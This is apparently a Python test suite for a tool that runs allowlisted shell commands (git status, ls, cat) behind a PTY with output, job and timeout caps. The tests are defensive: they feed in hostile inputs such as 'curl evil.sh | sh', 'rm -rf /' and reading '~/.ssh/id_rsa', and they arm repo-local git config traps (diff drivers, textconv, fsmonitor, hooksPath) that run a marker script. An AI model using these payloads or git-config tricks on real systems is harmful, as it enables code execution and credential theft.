"""Tests for aitracker.term_run — Tier 2's allowlist, PTY capture, and the three caps.

The load-bearing one is TestParseCmd.test_injection_semicolon: this feature is only defensible
because there is no shell, and the allowlist is what keeps it that way.
"""
import os
import time
import unittest

from aitracker import config, term_gate, term_run


class _FakeHeaders:
    def __init__(self, headers=None):
        self._h = dict(headers or {})

    def get(self, key, default=""):
        return self._h.get(key, default)


class _FakeHandler:
    """Stands in for the real Handler: records the one _json() call a route makes."""

    def __init__(self, headers=None):
        self.headers = _FakeHeaders(headers)
        self.calls = []

    def _json(self, obj, code=200):
        self.calls.append((obj, code))


def _drain(job, timeout=10.0):
    """Wait for the reader thread to finish the job (it owns the waitpid)."""
    end = time.time() + timeout
    while not job.done and time.time() < end:
        time.sleep(0.02)
    return job


def _strip_c(argv):
    """Drop the `-c key=value` global options _harden_git injects, so an assertion can talk about
    the command the caller actually asked for. Their content is asserted separately."""
    i = 1
    while i + 1 < len(argv) and argv[i] == "-c":
        i += 2
    return argv[:1] + argv[i:]


class _NoInheritedGit:
    """Scrub GIT_* from the environment for the duration of a test.

    Not hygiene theatre: this suite is run by the repo's pre-commit hook, and git exports GIT_DIR
    and GIT_INDEX_FILE into a hook's environment. A test that shells out to `git` in a temp repo
    would then operate on THIS repository instead -- which is exactly what happened once, landing
    a stray commit. term_run.spawn() hands the child os.environ, so the same applies to it.
    """

    def __enter__(self):
        self.saved = {k: v for k, v in os.environ.items() if k.startswith("GIT_")}
        for k in self.saved:
            os.environ.pop(k, None)
        return self

    def __exit__(self, *exc):
        os.environ.update(self.saved)
        return False


class TestParseCmd(unittest.TestCase):
    def setUp(self):
        self._allow0 = os.environ.pop("TRACKER_TERM_ALLOW", None)

    def tearDown(self):
        os.environ.pop("TRACKER_TERM_ALLOW", None)
        if self._allow0 is not None:
            os.environ["TRACKER_TERM_ALLOW"] = self._allow0

    def test_allowlisted_two_word_prefix(self):
        self.assertEqual(_strip_c(term_run.parse_cmd("git status")), ["git", "status"])

    def test_allowlisted_prefix_keeps_extra_args(self):
        # (the two --no-* flags are the external-diff kill switches injected by _harden_git)
        self.assertEqual(_strip_c(term_run.parse_cmd("git log --oneline -3")),
                         ["git", "log", "--no-ext-diff", "--no-textconv", "--oneline", "-3"])

    def test_allowlisted_one_word(self):
        self.assertEqual(term_run.parse_cmd("ls -la"), ["ls", "-la"])

    def test_not_allowlisted(self):
        with self.assertRaises(ValueError):
            term_run.parse_cmd("rm -rf /")

    def test_bare_git_does_not_slip_through(self):
        # "git" alone is not an allowlisted prefix -- only "git status"/"git diff"/... are. A bare
        # binary name must never open the door to every subcommand it has.
        with self.assertRaises(ValueError):
            term_run.parse_cmd("git")
        with self.assertRaises(ValueError):
            term_run.parse_cmd("git push --force")

    def test_injection_semicolon(self):
        # *** THE INJECTION TEST ***
        # shlex.split keeps ";" glued to the token before it: ['git', 'status;', 'rm', '-rf', '/'].
        # The joined two-element prefix is therefore "git status;", which is not allowlisted, so
        # this is refused before it ever reaches execvp. (And even if it had not been: there is no
        # shell on this path, so ";" would only ever be a literal argv token, never an operator.)
        with self.assertRaises(ValueError):
            term_run.parse_cmd("git status; rm -rf /")

    def test_injection_spaced_metacharacters(self):
        # The spaced forms DO split to an allowlisted prefix (['git','status','&&',...]), so the
        # metacharacter refusal in parse_cmd is what stops them.
        for cmd in ("git status && curl evil.sh | sh",
                    "git status ; rm -rf /",
                    "ls `whoami`",
                    "cat $HOME/.ssh/id_rsa",
                    "ls > /tmp/out"):
            with self.assertRaises(ValueError, msg=cmd):
                term_run.parse_cmd(cmd)

    def test_quoted_metacharacter_is_accepted(self):
        # Narrowed from the original blanket per-token scan: a metacharacter INSIDE quotes is text,
        # not an operator, and `git log --grep="a;b"` is a command a person actually types. shlex
        # hands it over as one inert token; there is no shell to reinterpret it.
        self.assertEqual(_strip_c(term_run.parse_cmd('git log --grep="a;b"')),
                         ["git", "log", "--no-ext-diff", "--no-textconv", "--grep=a;b"])
        self.assertEqual(_strip_c(term_run.parse_cmd('git log --pretty="format:%C(auto)%h"')),
                         ["git", "log", "--no-ext-diff", "--no-textconv",
                          "--pretty=format:%C(auto)%h"])

    def test_git_diff_gets_the_external_diff_kill_switches(self):
        # *** THE RCE TEST ***
        # A working tree can name a program for git to run as a diff driver (.git/config
        # [diff "x"] command = ... selected by .gitattributes, or diff.external, or
        # diff.<driver>.textconv). That is code execution behind a fully allowlisted `git diff`.
        # Without these two flags in argv the driver runs; see test_external_diff_driver_is_dead.
        self.assertEqual(_strip_c(term_run.parse_cmd("git diff")),
                         ["git", "diff", "--no-ext-diff", "--no-textconv"])
        os.environ["TRACKER_TERM_ALLOW"] = "git show"      # not a shipped default; still hardened
        self.assertEqual(_strip_c(term_run.parse_cmd("git show HEAD")),
                         ["git", "show", "--no-ext-diff", "--no-textconv", "HEAD"])
        os.environ.pop("TRACKER_TERM_ALLOW")
        # ... but only where git accepts them: `git status --no-ext-diff` is an unknown option.
        self.assertEqual(_strip_c(term_run.parse_cmd("git status")), ["git", "status"])
        self.assertEqual(_strip_c(term_run.parse_cmd("git branch")), ["git", "branch"])

    def test_repo_local_program_config_is_overridden(self):
        # `git status` accepts neither --no-ext-diff nor --no-textconv, and yet a repo-local
        # .git/config can still hand it a program to run (core.fsmonitor, core.hooksPath). Those
        # are killed with `-c key=value` global options, which must come BEFORE the subcommand.
        argv = term_run.parse_cmd("git status")
        self.assertEqual(argv[0], "git")
        got = [argv[i + 1] for i in range(1, len(argv) - 1) if argv[i] == "-c"]
        self.assertIn("core.fsmonitor=false", got)
        self.assertIn("core.hooksPath=/dev/null", got)
        self.assertIn("diff.external=", got)
        self.assertEqual(argv[1 + 2 * len(got)], "status")  # subcommand follows the -c block

    def test_dangerous_git_flags_are_refused_anywhere_in_argv(self):
        # Position matters: git lets the LAST occurrence win, so a caller who could append
        # --ext-diff after our injected --no-ext-diff would re-enable the driver.
        for cmd in ("git diff --ext-diff",
                    "git diff -- a.py --ext-diff",
                    "git log --textconv",
                    "git diff --exec-path=/tmp/evil",
                    "git status --git-dir=/tmp/evil/.git",
                    "git status --work-tree=/tmp/evil",
                    "git diff --output=/tmp/written-by-git",
                    "git log --upload-pack=/tmp/evil",
                    "git diff -c core.pager=/tmp/evil"):
            with self.assertRaises(ValueError, msg=cmd):
                term_run.parse_cmd(cmd)

    def test_cat_and_ls_are_confined_to_the_session_cwd(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            root = os.path.realpath(td)
            open(os.path.join(root, "inside.txt"), "w").close()
            os.symlink("/etc/hosts", os.path.join(root, "escape-link"))
            term_run.check_paths(["cat", "inside.txt"], root)          # inside: fine
            term_run.check_paths(["ls", "-la"], root)                  # flags are not paths
            term_run.check_paths(["ls"], root)
            term_run.check_paths(["git", "diff", "/etc/hosts"], root)  # only cat/ls are confined
            for argv in (["cat", "/etc/hosts"],
                         ["cat", os.path.expanduser("~/.ssh/id_rsa")],
                         ["cat", "../outside.txt"],
                         ["ls", "/"],
                         ["cat", "escape-link"]):                      # realpath on BOTH sides
                with self.assertRaises(ValueError, msg=str(argv)):
                    term_run.check_paths(argv, root)

    def test_empty_and_unbalanced(self):
        with self.assertRaises(ValueError):
            term_run.parse_cmd("")
        with self.assertRaises(ValueError):
            term_run.parse_cmd('cat "unterminated')

    def test_env_override_replaces_default_set(self):
        os.environ["TRACKER_TERM_ALLOW"] = "echo, uname -a"
        self.assertEqual(term_run.parse_cmd("echo hi"), ["echo", "hi"])
        self.assertEqual(term_run.parse_cmd("uname -a"), ["uname", "-a"])
        with self.assertRaises(ValueError):      # the default set is replaced, not extended
            term_run.parse_cmd("git status")

    def test_env_override_newline_separated(self):
        os.environ["TRACKER_TERM_ALLOW"] = "echo\nuname -a\n"
        self.assertEqual(term_run.allowlist(), ["echo", "uname -a"])


class TestSpawn(unittest.TestCase):
    """The Tier-2 equivalent of the feasibility spike: a real pty.fork + execvp round-trip."""

    def setUp(self):
        self._allow0 = os.environ.pop("TRACKER_TERM_ALLOW", None)

    def tearDown(self):
        os.environ.pop("TRACKER_TERM_ALLOW", None)
        if self._allow0 is not None:
            os.environ["TRACKER_TERM_ALLOW"] = self._allow0

    def test_spawn_captures_output(self):
        # `echo` is deliberately NOT in the default allowlist -- widen it for this test via the
        # documented env override rather than weakening the shipped default.
        os.environ["TRACKER_TERM_ALLOW"] = "echo"
        argv = term_run.parse_cmd("echo hi-from-pty")
        job = _drain(term_run.spawn(os.getcwd(), argv))
        self.assertTrue(job.done)
        self.assertIn(b"hi-from-pty", bytes(job.buf))
        self.assertEqual(job.rc, 0)
        self.assertFalse(job.truncated)

    def test_spawn_runs_in_the_given_cwd(self):
        # `ls` is in the shipped default set, so this proves the default allowlist end-to-end.
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            open(os.path.join(td, "marker-file.txt"), "w").close()
            job = _drain(term_run.spawn(td, term_run.parse_cmd("ls")))
            self.assertIn(b"marker-file.txt", bytes(job.buf))

    def test_repo_local_config_cannot_run_a_program(self):
        """End-to-end, against a real repo: every way a working tree's own .git/config can hand
        git a program to run, through a fully allowlisted command.

        Each case ARMS the trap first with an un-hardened argv and asserts the marker appears --
        a defence you never watched fail is not a verified defence -- then runs the argv that
        parse_cmd actually produces and asserts it does not.
        """
        import subprocess
        import tempfile
        with _NoInheritedGit(), tempfile.TemporaryDirectory() as td:
            repo = os.path.join(td, "repo")
            os.mkdir(repo)
            marker = os.path.join(td, "MARKER")
            evil = os.path.join(td, "evil.sh")
            with open(evil, "w") as f:
                f.write("#!/bin/sh\necho pwned > %s\n" % marker)
            os.chmod(evil, 0o755)

            def git(*a):
                subprocess.run(("git",) + a, cwd=repo, check=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            def fired():
                hit = os.path.exists(marker)
                if hit:
                    os.remove(marker)
                return hit

            git("init", "-q")
            git("config", "user.email", "t@t.t")
            git("config", "user.name", "t")
            with open(os.path.join(repo, "a.py"), "w") as f:
                f.write("one\n")
            git("add", "a.py")
            git("commit", "-qm", "init")
            with open(os.path.join(repo, "a.py"), "a") as f:
                f.write("two\n")
            with open(os.path.join(repo, ".gitattributes"), "w") as f:
                f.write("*.py diff=evil\n")

            def case(name, arm, cmd, setup, teardown=()):
                for kv in setup:
                    git("config", *kv)
                if callable(arm):
                    arm()
                else:
                    _drain(term_run.spawn(repo, arm))
                self.assertTrue(fired(), "%s: trap not armed, the attack did not reproduce" % name)
                job = _drain(term_run.spawn(repo, term_run.parse_cmd(cmd)))
                self.assertFalse(fired(), "%s ran: %r" % (name, bytes(job.buf)[:200]))
                for kv in teardown:
                    git("config", *kv)
                return job

            # 1. external diff driver named by .gitattributes + [diff "evil"] command
            job = case("diff driver", ["git", "diff"], "git diff",
                       [("diff.evil.command", evil)], [("--unset", "diff.evil.command")])
            self.assertIn(b"diff --git", bytes(job.buf))     # ... and it still produced a diff

            # 2. the parallel textconv filter -- --no-ext-diff alone does NOT close this one
            case("textconv", ["git", "diff", "--no-ext-diff"], "git diff",
                 [("diff.evil.textconv", evil)], [("--unset", "diff.evil.textconv")])

            # 3. core.editor, reachable through the allowlisted `git branch`
            # (armed with a plain subprocess: spawn() now always exports GIT_EDITOR=true, which
            #  is itself part of the fix, so it can no longer arm its own trap)
            case("core.editor",
                 lambda: subprocess.run(["git", "branch", "--edit-description"], cwd=repo,
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
                 "git branch --edit-description",
                 [("core.editor", evil)], [("--unset", "core.editor")])

            # 4. core.fsmonitor -- `git status` accepts NEITHER --no-* flag, so only the injected
            #    `-c core.fsmonitor=false` stops this.
            case("core.fsmonitor", ["git", "status"], "git status",
                 [("core.fsmonitor", evil)], [("--unset", "core.fsmonitor")])

            # 5. core.hooksPath -- `git status` fires post-index-change
            hooks = os.path.join(td, "hooks")
            os.mkdir(hooks)
            hook = os.path.join(hooks, "post-index-change")
            with open(hook, "w") as f:
                f.write("#!/bin/sh\necho pwned > %s\n" % marker)
            os.chmod(hook, 0o755)
            # post-index-change fires only when `git status` actually REWRITES the index: the
            # file has to be content-identical to the index but stat-different, so git refreshes
            # the entry. Restore the committed content, then move mtime before each run.
            path = os.path.join(repo, "a.py")
            with open(path, "w") as f:
                f.write("one\n")
            stamp = [time.time()]

            def touch():
                stamp[0] -= 120
                os.utime(path, (stamp[0], stamp[0]))
            git("config", "core.hooksPath", hooks)
            touch()
            _drain(term_run.spawn(repo, ["git", "status"]))
            self.assertTrue(fired(), "core.hooksPath: trap not armed")
            touch()
            _drain(term_run.spawn(repo, term_run.parse_cmd("git status")))
            self.assertFalse(fired(), "core.hooksPath hook ran")

    def test_no_zombie_left_behind(self):
        os.environ["TRACKER_TERM_ALLOW"] = "echo"
        job = _drain(term_run.spawn(os.getcwd(), term_run.parse_cmd("echo bye")))
        self.assertIsNotNone(job.rc)          # the reader thread reaped it
        with self.assertRaises(ChildProcessError):
            os.waitpid(job.pid, 0)            # ... so a second waitpid finds nothing

    def test_kill_stops_a_running_child(self):
        os.environ["TRACKER_TERM_ALLOW"] = "sleep"
        job = term_run.spawn(os.getcwd(), term_run.parse_cmd("sleep 30"))
        time.sleep(0.3)
        job.kill()
        _drain(job)
        self.assertTrue(job.done)
        self.assertEqual(job.rc, -9)          # SIGKILL, reported as a negative signal number


class TestCaps(unittest.TestCase):
    def test_byte_cap_truncates_with_marker(self):
        job = term_run.Job(jid="cap-test")     # no pid: feed() must not try to kill anything
        self.assertFalse(job.feed(b"x" * (term_run.MAX_BYTES + 4096)))
        self.assertTrue(job.truncated)
        self.assertIn(b"output truncated", bytes(job.buf))
        self.assertEqual(len(job.buf), term_run.MAX_BYTES + len(term_run.TRUNC_MARK))

    def test_byte_cap_across_many_small_feeds(self):
        job = term_run.Job(jid="cap-test-2")
        chunk = b"y" * 8192
        fed = 0
        while job.feed(chunk):
            fed += len(chunk)
            self.assertLessEqual(fed, term_run.MAX_BYTES)
        self.assertTrue(job.truncated)
        self.assertIn(b"output truncated", bytes(job.buf))

    def test_constants_are_the_specified_bounds(self):
        self.assertEqual(term_run.MAX_BYTES, 256 * 1024)
        self.assertEqual(term_run.MAX_JOBS, 3)
        self.assertEqual(term_run.TIMEOUT, 300)


class TestRoutes(unittest.TestCase):
    def setUp(self):
        self._terminal0, self._auth0 = config.TERMINAL, config.AUTH
        config.TERMINAL, config.AUTH = True, "u:p"
        self._jobs0 = dict(term_run.JOBS)
        term_run.JOBS.clear()

    def tearDown(self):
        config.TERMINAL, config.AUTH = self._terminal0, self._auth0
        term_run.JOBS.clear()
        term_run.JOBS.update(self._jobs0)

    def test_routes_are_registered(self):
        from aitracker import server
        self.assertIs(server.EXTRA_POST["/api/term/run"], term_run.run)
        self.assertIs(server.EXTRA_POST["/api/term/kill"], term_run.kill)
        self.assertIs(server.EXTRA_GET["/api/term/stream"], term_run.stream)

    def test_run_403s_when_terminal_disabled(self):
        config.TERMINAL = False
        h = _FakeHandler()
        term_run.run(h, None, {"session": "x", "cmd": "git status"})
        self.assertEqual(h.calls[-1][1], 403)
        self.assertFalse(term_gate.allowed())

    def test_run_400s_a_disallowed_command(self):
        h = _FakeHandler()
        term_run.run(h, None, {"session": "x", "cmd": "rm -rf /"})
        obj, code = h.calls[-1]
        self.assertEqual(code, 400)
        self.assertIn("not allowed", obj["error"])

    def test_fourth_concurrent_job_gets_429(self):
        for i in range(term_run.MAX_JOBS):
            term_run.JOBS["fake%d" % i] = term_run.Job(jid="fake%d" % i)   # pid 0, done False
        h = _FakeHandler()
        term_run.run(h, None, {"session": "x", "cmd": "git status"})
        obj, code = h.calls[-1]
        self.assertEqual(code, 429)
        self.assertIn("too many", obj["error"])

    def test_run_400s_when_the_session_has_no_cwd(self):
        h = _FakeHandler()
        term_run.run(h, None, {"session": "no-such-session-id", "cmd": "git status"})
        obj, code = h.calls[-1]
        self.assertEqual(code, 400)
        self.assertIn("working directory", obj["error"])

    def test_run_400s_cat_outside_the_session_cwd(self):
        # The route is where cwd becomes known, so this is where confinement is enforced.
        real = term_gate.session_cwd
        term_gate.session_cwd = lambda sid: "/tmp"
        try:
            h = _FakeHandler()
            term_run.run(h, None, {"session": "x", "cmd": "cat /etc/hosts"})
            obj, code = h.calls[-1]
            self.assertEqual(code, 400)
            self.assertIn("outside the session directory", obj["error"])
        finally:
            term_gate.session_cwd = real

    def test_kill_404s_an_unknown_job(self):
        h = _FakeHandler()
        term_run.kill(h, None, {"job": "nope"})
        self.assertEqual(h.calls[-1][1], 404)


if __name__ == "__main__":
    unittest.main()
